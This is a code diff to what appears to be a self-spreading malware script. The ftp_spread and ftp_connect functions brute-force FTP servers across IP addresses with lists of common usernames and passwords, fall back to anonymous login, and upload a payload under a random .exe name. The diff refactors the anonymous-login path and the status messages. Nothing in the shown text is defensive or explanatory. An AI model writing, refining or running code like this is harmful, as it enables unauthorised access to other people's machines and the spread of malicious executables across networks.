@@ -209,7 +209,8 @@ def ftp_connect(ip, user, pwd, anonymous=False):
     global PAYLOAD_PATH
     try:
         ftp = ftplib.FTP(ip, timeout=2)
-        ftp.login(user, pwd)
+        if anonymous: ftp.login()
+        else: ftp.login(user, pwd)
         random_name = f'{generate_random_name()}.exe'
         if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
         else: payload_path = download_payload()
@@ -232,22 +233,15 @@ def ftp_spread(common_users, common_pass):
                 for pwd in common_pass:
                     print(f"Trying for ip: {ip} with user: {user}, pass: {pwd}")
                     done = ftp_connect(ip, user, pwd)
-                    print(f"DONE Sending file for user: {user}, ip: {ip}")
-                    if done: break 
+                    if done: 
+                        print(f"DONE Sending file for user: {user}, ip: {ip}")
+                        break 
+                    else: print("ERROR NOT SEND")
             if not done:
-                try:
-                    print(f"Trying for ip: {ip} as anonymous user")
-                    ftp = ftplib.FTP(ip, timeout=2)
-                    ftp.login()
-                    random_name = f'{generate_random_name()}.exe'
-                    if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
-                    else: payload_path = download_payload()
-                    if payload_path:
-                        with open(payload_path, 'rb') as f:
-                            ftp.storbinary(f'STOR {random_name}', f)
-                    ftp.quit()
-                    print(f"DONE Sending file as anonymous user for ip: {ip}") 
-                except: continue
+                print(f"Trying for ip: {ip} as anonymous user")
+                if ftp_connect(ip, "", "", anonymous=True):
+                    print(f"DONE Sending file as anonymous user for ip: {ip}")
+                else: print("ERROR NOT SEND")
                 
     except:
         pass
